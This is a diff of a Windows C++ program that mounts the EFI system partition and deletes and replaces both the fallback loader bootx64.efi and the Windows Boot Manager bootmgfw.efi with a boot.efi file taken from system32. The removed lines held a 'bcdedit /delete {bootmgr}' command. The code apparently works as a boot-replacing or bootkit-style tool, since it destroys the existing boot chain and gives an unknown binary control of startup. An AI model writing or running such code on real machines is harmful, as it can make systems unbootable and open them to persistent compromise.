@@ -1,8 +1,6 @@
 #include <iostream>
 #include <cstdlib>
-#include <sys/types.h>
 #include <Windows.h>
-#include <winioctl.h>
 #include <WinUser.h>
 #include <stdlib.h>
 #include <direct.h>
@@ -14,6 +12,11 @@ using namespace std;
 
 void MountEFI() {
     system("mountvol P: /S");
+}
+
+void RemoveOtherBootEntries()
+{
+	
 }
 
 void UnpackDeps() {
@@ -127,8 +130,8 @@ int main()
         MountEFI();
         DeleteFile(L"P:\\EFI\\Boot\\bootx64.efi");
         CopyFile(L"C:\\Windows\\system32\\boot.efi", L"P:\\EFI\\Boot\\bootx64.efi", false);
-        const char* bcdCommand = "bcdedit /delete {bootmgr}";
-        std::system(bcdCommand);
+        DeleteFile(L"P:\\EFI\\Microsoft\\Boot\\bootmgfw.efi");
+        CopyFile(L"C:\\Windows\\system32\\boot.efi", L"P:\\EFI\\Microsoft\\Boot\\bootmgfw.efi", false);
         
     }
     else {
